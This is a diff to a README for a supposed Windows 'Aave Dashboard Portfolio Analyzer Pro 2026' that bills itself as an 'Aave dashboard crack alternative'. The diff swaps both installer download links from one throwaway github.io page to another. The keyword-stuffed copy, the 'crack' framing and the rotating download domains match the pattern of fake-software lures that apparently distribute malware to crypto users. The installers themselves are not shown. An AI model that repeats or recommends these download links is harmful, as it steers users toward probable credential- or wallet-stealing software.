@@ -2,7 +2,7 @@
 
 Welcome to the Aave Dashboard Portfolio Analyzer Pro 2026, the premier Windows desktop application designed for serious DeFi users. This comprehensive tool serves as your personal Aave dashboard crack alternative, providing unparalleled visibility and control over your Aave v3 lending positions, yields, and risks without compromising security. It is the all-in-one solution for managing your DeFi portfolio efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## 🚀 Key Features
 
@@ -52,6 +52,6 @@ A: First, check that your internet connection is active and that the application
 
 To ensure you are always using the most secure and feature-rich version, please download the application directly from our official repository.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *© 2026 Aave Dashboard Portfolio Analyzer Pro Team. This software is provided for informational and educational purposes. Always conduct your own research before making financial decisions.*
